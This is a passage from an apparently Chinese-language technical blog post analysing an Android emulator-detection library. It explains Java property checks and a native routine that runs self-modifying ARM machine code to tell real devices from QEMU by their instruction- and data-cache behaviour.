class="string">&quot;\x8a\x00\x00\x54&quot;</span><span class="comment">//b.ge44 &lt;out&gt;</span></span><br><span class="line">            <span class="string">&quot;\x5f\x28\x00\xf1&quot;</span>  <span class="comment">//cmpx2, #0xa</span></span><br><span class="line">            <span class="string">&quot;\x4a\x00\x00\x54&quot;</span><span class="comment">//b.ge44 &lt;out&gt;</span></span><br><span class="line">            <span class="string">&quot;\xf9\xff\xff\x17&quot;</span><span class="comment">//b24 &lt;code&gt;</span></span><br><span class="line">            <span class="string">&quot;\xfd\x7b\x42\xa9&quot;</span><span class="comment">//ldpx29, x30, [sp,#32]</span></span><br><span class="line">            <span class="string">&quot;\xff\xc3\x00\x91&quot;</span><span class="comment">//addsp, sp, #0x30</span></span><br><span class="line">            <span class="string">&quot;\xc0\x03\x5f\xd6&quot;</span> <span class="comment">//ret</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span> <span class="comment">//nop</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span> <span class="comment">//nop</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span> <span class="comment">//nop</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span> <span class="comment">//nop</span></span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line"><span class="comment">//   LOGI(&quot; start  detect&quot;);</span></span><br><span class="line">    <span class="type">void</span> *exec = <span class="built_in">mmap</span>(<span class="literal">NULL</span>, (<span class="type">size_t</span>) <span class="built_in">getpagesize</span>(), PROT, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>,</span><br><span class="line">                      (<span class="type">off_t</span>) <span class="number">0</span>);</span><br><span class="line"><span class="comment">//    LOGI(&quot; mmap sucess exec  %x  %d &quot;, exec,(size_t) getpagesize());</span></span><br><span class="line">    <span class="keyword">if</span> (exec == (<span class="type">void</span> *) <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="type">int</span> fd = <span class="built_in">fopen</span>(<span class="string">&quot;/dev/zero&quot;</span>, <span class="string">&quot;w+&quot;</span>);</span><br><span class="line">        exec = <span class="built_in">mmap</span>(<span class="literal">NULL</span>, (<span class="type">size_t</span>) <span class="built_in">getpagesize</span>(), PROT, MAP_PRIVATE, fd, (<span class="type">off_t</span>) <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (exec == (<span class="type">void</span> *) <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (type == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(exec, code32, <span class="built_in">sizeof</span>(code32));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(exec, code64, <span class="built_in">sizeof</span>(code64));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    LOGI(&quot; mmap copy  exec  %x&quot;, exec);</span></span><br><span class="line">    <span class="comment">//如果不是 (size_t) getpagesize() 是sizeof（code），就必须加上LOGI(&quot; mmap sucess exec  %x&quot;, exec); ，才能降低崩溃概率，这尼玛操蛋</span></span><br><span class="line">    asmcheck = (<span class="type">int</span> *) exec;</span><br><span class="line">    __clear_cache(exec, exec + (<span class="type">size_t</span>) <span class="built_in">getpagesize</span>());</span><br><span class="line">    a = <span class="built_in">asmcheck</span>();</span><br><span class="line"><span class="comment">//        LOGI(&quot; ret --  %x&quot;, a);</span></span><br><span class="line">    <span class="built_in">munmap</span>(exec, <span class="built_in">getpagesize</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a == <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来到了检测模拟器的native层函数，详细分析如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> type = getArch(env);</span><br><span class="line"><span class="keyword">if</span> (type == <span class="number">0</span> || type == <span class="number">1</span>) &#123; <span class="keyword">return</span> JNI_TRUE; &#125;</span><br></pre></td></tr></table></figure><ol><li><p><strong>获取架构</strong>：代码首先通过 JNI 回调 <code>EmulatorDetectUtil.getSystemArch()</code> 方法。这个 Java 方法会读取系统属性 <code>ro.product.cpu.abi</code> 来获取当前的 CPU ABI（应用二进制接口）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getSystemArch</span><span class="params">()</span> &#123;</span><br><span class="line">    String cpuAbi=  PropertiesGet.getString(<span class="string">&quot;ro.product.cpu.abi&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;armeabi-v7a&quot;</span>.equals(cpuAbi))</span><br><span class="line">        <span class="keyword">return</span> Arch.ARM32;</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;arm64-v8a&quot;</span>.equals(cpuAbi))</span><br><span class="line">        <span class="keyword">return</span> Arch.ARM64;</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;x86&quot;</span>.equals(cpuAbi)  )</span><br><span class="line">        <span class="keyword">return</span> Arch.X86;</span><br><span class="line">    <span class="keyword">if</span>(  <span class="string">&quot;x86_64&quot;</span>.equals(cpuAbi))</span><br><span class="line">        <span class="keyword">return</span> Arch.X86_64;</span><br><span class="line">    <span class="keyword">return</span> Arch.ARM64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>判断架构</strong>：</p><ul><li><code>type == 0</code> 对应 <code>x86</code></li><li><code>type == 1</code> 对应 <code>x86_64</code></li></ul></li><li><p><strong>判定结果</strong>：如果检测到 CPU 是 x86 或 x86_64 架构，函数就**立即返回 <code>JNI_TRUE</code>**，判定当前环境为模拟器</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">    <span class="type">char</span> code32[] =</span><br><span class="line">            <span class="string">&quot;\x04\xe0\x2d\xE5&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x20\xA0\xE3&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xA0\xE3&quot;</span></span><br><span class="line">            <span class="string">&quot;\x01\x20\x82\xE2&quot;</span></span><br><span class="line">            <span class="string">&quot;\x0c\x30\x4f\xe2&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x10\x93\xE5&quot;</span></span><br><span class="line">            <span class="string">&quot;\x01\x00\x80\xE2&quot;</span></span><br><span class="line">            <span class="string">&quot;\x0c\x30\x4f\xe2&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x10\x83\xE5&quot;</span></span><br><span class="line">            <span class="string">&quot;\x0A\x00\x50\xE3&quot;</span></span><br><span class="line">            <span class="string">&quot;\x02\x00\x00\xAA&quot;</span></span><br><span class="line">            <span class="string">&quot;\x0A\x00\x52\xE3&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\x00\xAA&quot;</span></span><br><span class="line">            <span class="string">&quot;\xf7\xff\xff\xea&quot;</span></span><br><span class="line">            <span class="string">&quot;\x04\xf0\x9d\xE4&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> code64[] =</span><br><span class="line">            <span class="string">&quot;\xff\xc3\x00\xd1&quot;</span><span class="comment">//subsp, sp, #0x30</span></span><br><span class="line">            <span class="string">&quot;\xfd\x7b\x02\xa9&quot;</span><span class="comment">//x29, x30, [sp,#32]</span></span><br><span class="line">            <span class="string">&quot;\x02\x00\x80\xd2&quot;</span><span class="comment">//x2, #0x0</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\x80\xd2&quot;</span><span class="comment">//movx0, #0x0</span></span><br><span class="line">            <span class="string">&quot;\x42\x04\x00\x91&quot;</span><span class="comment">//addx2, x2, #0x1</span></span><br><span class="line">            <span class="string">&quot;\xe3\xff\xff\x10&quot;</span><span class="comment">//adrx3, 18 &lt;smc&gt;</span></span><br><span class="line">            <span class="string">&quot;\x61\x00\x40\xf9&quot;</span><span class="comment">//ldrx1, [x3]</span></span><br><span class="line">            <span class="string">&quot;\x00\x04\x00\x91&quot;</span><span class="comment">//addx0, x0, #0x1</span></span><br><span class="line">            <span class="string">&quot;\xe3\xff\xff\x10&quot;</span><span class="comment">//adrx3, 24 &lt;code&gt;</span></span><br><span class="line">            <span class="string">&quot;\x61\x00\x00\xf9&quot;</span><span class="comment">//strx1, [x3]</span></span><br><span class="line">            <span class="string">&quot;\x1f\x28\x00\xf1&quot;</span> <span class="comment">//cmpx0, #0xa</span></span><br><span class="line">            <span class="string">&quot;\x8a\x00\x00\x54&quot;</span><span class="comment">//b.ge44 &lt;out&gt;</span></span><br><span class="line">            <span class="string">&quot;\x5f\x28\x00\xf1&quot;</span>  <span class="comment">//cmpx2, #0xa</span></span><br><span class="line">            <span class="string">&quot;\x4a\x00\x00\x54&quot;</span><span class="comment">//b.ge44 &lt;out&gt;</span></span><br><span class="line">            <span class="string">&quot;\xf9\xff\xff\x17&quot;</span><span class="comment">//b24 &lt;code&gt;</span></span><br><span class="line">            <span class="string">&quot;\xfd\x7b\x42\xa9&quot;</span><span class="comment">//ldpx29, x30, [sp,#32]</span></span><br><span class="line">            <span class="string">&quot;\xff\xc3\x00\x91&quot;</span><span class="comment">//addsp, sp, #0x30</span></span><br><span class="line">            <span class="string">&quot;\xc0\x03\x5f\xd6&quot;</span> <span class="comment">//ret</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span> <span class="comment">//nop</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span> <span class="comment">//nop</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span> <span class="comment">//nop</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span> <span class="comment">//nop</span></span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line"><span class="comment">//   LOGI(&quot; start  detect&quot;);</span></span><br><span class="line">    <span class="type">void</span> *exec = mmap(<span class="literal">NULL</span>, (<span class="type">size_t</span>) getpagesize(), PROT, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>,</span><br><span class="line">                      (<span class="type">off_t</span>) <span class="number">0</span>);</span><br><span class="line"><span class="comment">//    LOGI(&quot; mmap sucess exec  %x  %d &quot;, exec,(size_t) getpagesize());</span></span><br><span class="line">    <span class="keyword">if</span> (exec == (<span class="type">void</span> *) <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="type">int</span> fd = fopen(<span class="string">&quot;/dev/zero&quot;</span>, <span class="string">&quot;w+&quot;</span>);</span><br><span class="line">        exec = mmap(<span class="literal">NULL</span>, (<span class="type">size_t</span>) getpagesize(), PROT, MAP_PRIVATE, fd, (<span class="type">off_t</span>) <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (exec == (<span class="type">void</span> *) <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (type == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(exec, code32, <span class="keyword">sizeof</span>(code32));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(exec, code64, <span class="keyword">sizeof</span>(code64));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    LOGI(&quot; mmap copy  exec  %x&quot;, exec);</span></span><br><span class="line">    <span class="comment">//如果不是 (size_t) getpagesize() 是sizeof（code），就必须加上LOGI(&quot; mmap sucess exec  %x&quot;, exec); ，才能降低崩溃概率，这尼玛操蛋</span></span><br><span class="line">    asmcheck = (<span class="type">int</span> *) exec;</span><br><span class="line">    __clear_cache(exec, exec + (<span class="type">size_t</span>) getpagesize());</span><br><span class="line">    a = asmcheck();</span><br><span class="line"><span class="comment">//        LOGI(&quot; ret --  %x&quot;, a);</span></span><br><span class="line">    munmap(exec, getpagesize());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a == <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>利用了真实 ARM 硬件分离的 I&#x2F;D Cache 与 QEMU 动态翻译引擎在处理自修改代码时的缓存一致性行为差异来区分模拟器</p><blockquote><p><strong>真机 (ARM CPU) 的行为</strong></p><ul><li><strong>哈佛&#x2F;改进型哈佛架构 (Harvard&#x2F;Modified Harvard Architecture)<strong>：现代高性能 ARM 内核（如 Cortex-A 系列）普遍采用这种架构。其核心特征就是</strong>指令总线和数据总线分离</strong>，从而实现了独立的指令缓存（I-Cache）和数据缓存（D-Cache）。</li><li><strong>缓存一致性问题 (Cache Coherency Problem)<strong>：当一个 CPU 核心执行 <code>STR</code> (Store) 指令修改一段内存时，这个写操作是通过数据路径进行的，它会更新 D-Cache 和最终的主存。然而，如果被修改的内存区域恰好也作为指令被加载到了 I-Cache 中，硬件本身</strong>不会</strong>自动使 I-Cache 中对应的缓存行（Cache Line）失效。</li><li><strong><code>__clear_cache</code> 的必要性</strong>：为了解决这个问题，ARM 架构提供了特定的指令（如 <code>IC IALLU</code>, <code>DC CIVAC</code>）和相应的系统调用（最终由内核实现），允许软件显式地管理缓存。<code>__clear_cache</code> 这个 GCC 内建函数（或类似的库函数）就是上层对这些底层操作的封装。它的作用是：<ol><li>将 D-Cache 中被修改的数据写回到主存（Write-Back&#x2F;Clean）。</li><li>使 I-Cache 中覆盖了相同内存地址的缓存行失效（Invalidate）。 这样，当 CPU 再次从该地址取指时，由于 I-Cache Miss，它会从主存中重新加载最新的、已被修改的指令。</li></ol></li><li><strong>检测利用点</strong>：如果不调用 <code>__clear_cache</code>，CPU 就会执行 I-Cache 中陈旧的指令，导致程序行为与预期不符。</li></ul><p><strong>模拟器 (QEMU) 的行为</strong></p><ul><li>**动态二进制翻译 (Dynamic Binary Translation - DBT)**：QEMU 的核心是它的 TCG (Tiny Code Generator)。它并非逐条解释执行 ARM 指令，而是将一个 ARM 指令块（Guest Code）动态翻译成一段等效的、能在宿主 CPU（Host CPU，通常是 x86）上直接运行的机器码块（Host Code）。</li><li><strong>翻译缓存与内存监控</strong>：QEMU 会缓存这些翻译好的代码块。为了保证正确性，QEMU 必须监控被模拟的客户机内存（Guest Memory）。当 QEMU 检测到一段已经被翻译过的 Guest Code 所在的内存区域被写操作修改时，它会<strong>废弃（Invalidate）</strong>掉对应的、已缓存的 Host Code。</li><li><strong>重新翻译 (Re-translation)<strong>：当模拟的程序流程再次跳转到那段被修改过的地址时，QEMU 会发现没有可用的翻译缓存，于是它会重新从 Guest Memory 中读取</strong>最新的指令</strong>，进行新一轮的翻译和执行。</li><li><strong>检测利用点</strong>：QEMU 的这种为保证模拟正确性而设计的机制，恰好“完美”地处理了自修改代码。它表现出的行为，等同于一个<strong>缓存永远同步</strong>的理想化处理器。</li></ul></blockquote><p>说白了就是真机的<code>i-cache</code>和<code>d-cache</code>是不是随时同步的，当<code>i-cache</code>调用<code>STR(store)</code>指令时，是通过数据总线来更新<code>d-cache</code>和主存的，如果此时没及时调用<code>__clear_cache</code>的话，也会继续执行当前<code>cache line</code>的代码</p><blockquote><p><code>cache line</code>就是 <strong>CPU 缓存 (Cache) 和主内存 (RAM) 之间数据传输的最小单位</strong>（毕竟如果一个字节一个字节从CPU中读取的话，那么太浪费资源了，因此就直接读很多个字节（称之为<code>cache line</code>），常见的大小是 32 字节、64 字节或 128 字节</p></blockquote><p>而模拟器一般都是缓存永远同步的，即会执行最新修改的代码</p><p>这里利用的就是在真机中如果不调用 <code>__clear_cache</code>，CPU 就会执行 <code>I-Cache</code> 中陈旧的指令，导致程序行为与预期不符</p><blockquote><p><code>__clear_cache</code> 的作用就是 强制<strong>冲刷流水线（Pipeline Flush）</strong>并使 <code>I-Cache</code> 失效</p></blockquote><h3 id="onCreate-1"><a href="#onCreate-1" class="headerlink" title="onCreate"></a>onCreate</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  UI进程检测，可能影响UI线程</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">binding.btnSycnSycSimu.<span class="built_in">setOnClickListener</span>(<span class="keyword">new</span> View.<span class="built_in">OnClickListener</span>() &#123;</span><br><span class="line">    @Override</span><br><span class="line">    <span class="keyword">public</span> <span class="type">void</span> <span class="built_in">onClick</span>(View v) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">            TextView textView = (TextView) <span class="built_in">findViewById</span>(R.id.btn_sycn_syc_simu);</span><br><span class="line">            textView.<span class="built_in">setText</span>(<span class="string">&quot; 内存同步是否模拟器 &quot;</span> + EmulatorDetectUtil.<span class="built_in">isEmulator</span>(MainActivity.<span class="keyword">this</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>通过<code>EmulatorDetectUtil.isEmulator(MainActivity.this)</code>来检测<code>UI</code>进程</p><p><strong>同步的、在当前线程和当前进程中</strong>执行的方法调用</p><p>而上面那种是<strong>异步的、通过AIDL在另一个服务进程中</strong>执行的方法调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//        特征值判断是否模拟器</span></span><br><span class="line">        binding.btnSample.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                <span class="type">TextView</span> <span class="variable">textView</span> <span class="operator">=</span> (TextView) findViewById(R.id.btn_sample);</span><br><span class="line">                textView.setText(<span class="string">&quot;特征信息判断是否模拟器 &quot;</span> + AndroidDeviceIMEIUtil.isRunOnEmulator(MainActivity.<span class="built_in">this</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>调用<code>AndroidDeviceIMEIUtil.isRunOnEmulator(MainActivity.this)</code>方法来特征检测</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AndroidDeviceIMEIUtil</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isRunOnEmulator</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> EmuCheckUtil.mayOnEmulator(context);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">mayOnEmulator</span><span class="params">(Context context)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> mayOnEmulatorViaQEMU(context)</span><br><span class="line">            || isEmulatorViaBuild(context)</span><br><span class="line">            || isEmulatorFromAbi()</span><br><span class="line">            || isEmulatorFromCpu();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="mayOnEmulatorViaQEMU"><a href="#mayOnEmulatorViaQEMU" class="headerlink" title="mayOnEmulatorViaQEMU"></a>mayOnEmulatorViaQEMU</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  qemu模拟器特征</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">mayOnEmulatorViaQEMU</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">qemu</span> <span class="operator">=</span> PropertiesGet.getString(<span class="string">&quot;ro.kernel.qemu&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>.equals(qemu);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中getString函数如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.snail.antifake.jni;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: snail</span></span><br><span class="line"><span class="comment"> * Data: 2017/7/20 上午9:11</span></span><br><span class="line"><span class="comment"> * Des:</span></span><br><span class="line"><span class="comment"> * version:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PropertiesGet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;property_get&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title function_">native_get</span><span class="params">(String key)</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title function_">native_get</span><span class="params">(String key,String def)</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getString</span><span class="params">(String key)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> native_get(key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getString</span><span class="params">(String key,String def)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> native_get(key,def);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是通过native获得</p><p>在cmake中</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">add_library</span>(</span><br><span class="line">      <span class="comment"># 设置so文件名称.</span></span><br><span class="line">       property_get</span><br><span class="line">       <span class="comment"># 设置这个so文件为共享.</span></span><br><span class="line">       SHARED</span><br><span class="line">       <span class="comment"># Provides a relative path to your source file(s).</span></span><br><span class="line">       src/main/jni/property/proget.c)</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* DO NOT EDIT THIS FILE - it is machine generated 